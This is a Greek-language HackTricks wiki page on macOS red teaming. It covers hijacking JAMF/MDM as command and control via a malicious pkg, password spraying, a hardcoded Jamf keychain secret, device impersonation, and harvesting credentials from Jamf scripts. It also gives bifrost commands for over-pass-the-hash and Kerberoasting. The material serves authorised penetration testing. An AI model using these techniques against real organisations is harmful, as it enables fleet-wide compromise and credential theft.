# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Κατάχρηση MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Αν καταφέρετε να **συμβιβάσετε τα διαπιστευτήρια διαχειριστή** για να αποκτήσετε πρόσβαση στην πλατφόρμα διαχείρισης, μπορείτε να **συμβιβάσετε δυνητικά όλους τους υπολογιστές** διανέμοντας το κακόβουλο λογισμικό σας στις μηχανές.

Για red teaming σε περιβάλλοντα MacOS, συνιστάται έντονα να έχετε κάποια κατανόηση του πώς λειτουργούν τα MDMs:

{{#ref}}
macos-mdm/
{{#endref}}

### Χρήση MDM ως C2

Ένα MDM θα έχει άδεια να εγκαθιστά, να ερωτά ή να αφαιρεί προφίλ, να εγκαθιστά εφαρμογές, να δημιουργεί τοπικούς λογαριασμούς διαχειριστή, να ορίζει κωδικό πρόσβασης firmware, να αλλάζει το κλειδί FileVault...

Για να τρέξετε το δικό σας MDM, χρειάζεστε να **υπογραφεί το CSR σας από έναν προμηθευτή** που θα μπορούσατε να προσπαθήσετε να αποκτήσετε με [**https://mdmcert.download/**](https://mdmcert.download/). Και για να τρέξετε το δικό σας MDM για συσκευές Apple, θα μπορούσατε να χρησιμοποιήσετε [**MicroMDM**](https://github.com/micromdm/micromdm).

Ωστόσο, για να εγκαταστήσετε μια εφαρμογή σε μια εγγεγραμμένη συσκευή, χρειάζεται ακόμα να είναι υπογεγραμμένη από έναν λογαριασμό προγραμματιστή... ωστόσο, κατά την εγγραφή MDM, η **συσκευή προσθέτει το SSL cert του MDM ως αξιόπιστη CA**, οπότε μπορείτε τώρα να υπογράψετε οτιδήποτε.

Για να εγγραφεί η συσκευή σε ένα MDM, χρειάζεται να εγκαταστήσετε ένα **`mobileconfig`** αρχείο ως root, το οποίο θα μπορούσε να παραδοθεί μέσω ενός **pkg** αρχείου (μπορείτε να το συμπιέσετε σε zip και όταν κατεβεί από το safari θα αποσυμπιεστεί).

**Mythic agent Orthrus** χρησιμοποιεί αυτή την τεχνική.

### Κατάχρηση JAMF PRO

Η JAMF μπορεί να εκτελεί **προσαρμοσμένα σενάρια** (σενάρια που αναπτύχθηκαν από τον sysadmin), **εγγενή payloads** (δημιουργία τοπικού λογαριασμού, ορισμός κωδικού EFI, παρακολούθηση αρχείων/διεργασιών...) και **MDM** (ρυθμίσεις συσκευής, πιστοποιητικά συσκευής...).

#### Αυτοεγγραφή JAMF

Πηγαίνετε σε μια σελίδα όπως `https://<company-name>.jamfcloud.com/enroll/` για να δείτε αν έχουν **ενεργοποιήσει την αυτοεγγραφή**. Αν την έχουν, μπορεί να **ζητήσει διαπιστευτήρια για πρόσβαση**.

Μπορείτε να χρησιμοποιήσετε το σενάριο [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) για να εκτελέσετε μια επίθεση password spraying.

Επιπλέον, αφού βρείτε τα κατάλληλα διαπιστευτήρια, θα μπορούσατε να είστε σε θέση να σπάσετε άλλους χρήστες με την επόμενη φόρμα:

![](<../../images/image (107).png>)

#### Αυθεντικοποίηση συσκευής JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Το **`jamf`** δυαδικό περιείχε το μυστικό για να ανοίξει το keychain, το οποίο κατά την ανακάλυψη ήταν **κοινό** σε όλους και ήταν: **`jk23ucnq91jfu9aj`**.\
Επιπλέον, το jamf **επιμένει** ως **LaunchDaemon** στο **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Κατάληψη Συσκευής JAMF

Η **JSS** (Jamf Software Server) **URL** που θα χρησιμοποιήσει το **`jamf`** βρίσκεται στο **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Αυτό το αρχείο περιέχει βασικά την URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Έτσι, ένας επιτιθέμενος θα μπορούσε να ρίξει ένα κακόβουλο πακέτο (`pkg`) που **επικαλύπτει αυτό το αρχείο** κατά την εγκατάσταση, ρυθμίζοντας το **URL σε έναν Mythic C2 listener από έναν Typhon agent** για να μπορεί τώρα να εκμεταλλευτεί το JAMF ως C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Για να **παριστάνεις την επικοινωνία** μεταξύ μιας συσκευής και του JMF χρειάζεσαι:

- Το **UUID** της συσκευής: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Το **JAMF keychain** από: `/Library/Application\ Support/Jamf/JAMF.keychain` που περιέχει το πιστοποιητικό της συσκευής

Με αυτές τις πληροφορίες, **δημιούργησε μια VM** με το **κλεμμένο** Hardware **UUID** και με **SIP απενεργοποιημένο**, ρίξε το **JAMF keychain,** **hook** τον Jamf **agent** και κλέψε τις πληροφορίες του.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Μπορείς επίσης να παρακολουθείς την τοποθεσία `/Library/Application Support/Jamf/tmp/` για τα **custom scripts** που οι διαχειριστές μπορεί να θέλουν να εκτελέσουν μέσω Jamf καθώς **τοποθετούνται εδώ, εκτελούνται και αφαιρούνται**. Αυτά τα scripts **μπορεί να περιέχουν διαπιστευτήρια**.

Ωστόσο, τα **διαπιστευτήρια** μπορεί να περάσουν σε αυτά τα scripts ως **παράμετροι**, οπότε θα χρειαστεί να παρακολουθείς `ps aux | grep -i jamf` (χωρίς καν να είσαι root).

Το script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) μπορεί να ακούει για νέα αρχεία που προστίθενται και νέα επιχειρήματα διαδικασίας.

### macOS Remote Access

Και επίσης για τα **MacOS** "ειδικά" **δίκτυα** **πρωτοκόλλων**:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Σε ορισμένες περιπτώσεις θα διαπιστώσεις ότι ο **υπολογιστής MacOS είναι συνδεδεμένος σε ένα AD**. Σε αυτό το σενάριο θα πρέπει να προσπαθήσεις να **καταγράψεις** τον ενεργό κατάλογο όπως είσαι συνηθισμένος. Βρες κάποια **βοήθεια** στις παρακάτω σελίδες:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Κάποιο **τοπικό εργαλείο MacOS** που μπορεί επίσης να σε βοηθήσει είναι το `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Επίσης, υπάρχουν μερικά εργαλεία προετοιμασμένα για MacOS για αυτόματη καταμέτρηση του AD και αλληλεπίδραση με το kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): Το MacHound είναι μια επέκταση του εργαλείου ελέγχου Bloodhound που επιτρέπει τη συλλογή και την εισαγωγή σχέσεων Active Directory σε MacOS hosts.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Το Bifrost είναι ένα έργο Objective-C σχεδιασμένο για να αλληλεπιδρά με τα APIs Heimdal krb5 σε macOS. Ο στόχος του έργου είναι να επιτρέψει καλύτερη ασφάλεια δοκιμών γύρω από το Kerberos σε συσκευές macOS χρησιμοποιώντας εγγενή APIs χωρίς να απαιτείται κανένα άλλο πλαίσιο ή πακέτα στον στόχο.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Εργαλείο JavaScript for Automation (JXA) για την καταμέτρηση Active Directory.

### Πληροφορίες Τομέα
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Χρήστες

Οι τρεις τύποι χρηστών MacOS είναι:

- **Τοπικοί Χρήστες** — Διαχειρίζονται από την τοπική υπηρεσία OpenDirectory, δεν είναι συνδεδεμένοι με κανέναν τρόπο στο Active Directory.
- **Δικτυακοί Χρήστες** — Μεταβλητοί χρήστες Active Directory που απαιτούν σύνδεση με τον διακομιστή DC για αυθεντικοποίηση.
- **Κινητοί Χρήστες** — Χρήστες Active Directory με τοπικό αντίγραφο ασφαλείας για τα διαπιστευτήρια και τα αρχεία τους.

Οι τοπικές πληροφορίες σχετικά με τους χρήστες και τις ομάδες αποθηκεύονται στον φάκελο _/var/db/dslocal/nodes/Default._\
Για παράδειγμα, οι πληροφορίες για τον χρήστη που ονομάζεται _mark_ αποθηκεύονται στο _/var/db/dslocal/nodes/Default/users/mark.plist_ και οι πληροφορίες για την ομάδα _admin_ είναι στο _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Εκτός από τη χρήση των ακμών HasSession και AdminTo, **το MacHound προσθέτει τρεις νέες ακμές** στη βάση δεδομένων Bloodhound:

- **CanSSH** - οντότητα που επιτρέπεται να SSH στον υπολογιστή
- **CanVNC** - οντότητα που επιτρέπεται να VNC στον υπολογιστή
- **CanAE** - οντότητα που επιτρέπεται να εκτελεί σενάρια AppleEvent στον υπολογιστή
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Περισσότερες πληροφορίες στο [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ password

Αποκτήστε κωδικούς πρόσβασης χρησιμοποιώντας:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Είναι δυνατόν να αποκτήσετε τον κωδικό πρόσβασης **`Computer$`** μέσα από το System keychain.

### Over-Pass-The-Hash

Αποκτήστε ένα TGT για έναν συγκεκριμένο χρήστη και υπηρεσία:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Μόλις συγκεντρωθεί το TGT, είναι δυνατή η έγχυσή του στην τρέχουσα συνεδρία με:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Με τα αποκτηθέντα εισιτήρια υπηρεσίας είναι δυνατή η προσπάθεια πρόσβασης σε κοινές χρήσεις σε άλλους υπολογιστές:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Πρόσβαση στο Keychain

Το Keychain περιέχει πιθανότατα ευαίσθητες πληροφορίες που αν αποκτηθούν χωρίς να παραχθεί προτροπή θα μπορούσαν να βοηθήσουν στην προώθηση μιας άσκησης red team:

{{#ref}}
macos-keychain.md
{{#endref}}

## Εξωτερικές Υπηρεσίες

Η Red Teaming στο MacOS διαφέρει από τη συνηθισμένη Red Teaming στα Windows, καθώς συνήθως **το MacOS είναι ενσωματωμένο με πολλές εξωτερικές πλατφόρμες απευθείας**. Μια κοινή ρύθμιση του MacOS είναι η πρόσβαση στον υπολογιστή χρησιμοποιώντας **συνδεδεμένα διαπιστευτήρια OneLogin και πρόσβαση σε πολλές εξωτερικές υπηρεσίες** (όπως github, aws...) μέσω του OneLogin.

## Διάφορες τεχνικές Red Team

### Safari

Όταν ένα αρχείο κατεβαίνει στο Safari, αν είναι "ασφαλές" αρχείο, θα **ανοίξει αυτόματα**. Έτσι, για παράδειγμα, αν **κατεβάσετε ένα zip**, θα αποσυμπιεστεί αυτόματα:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Αναφορές

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
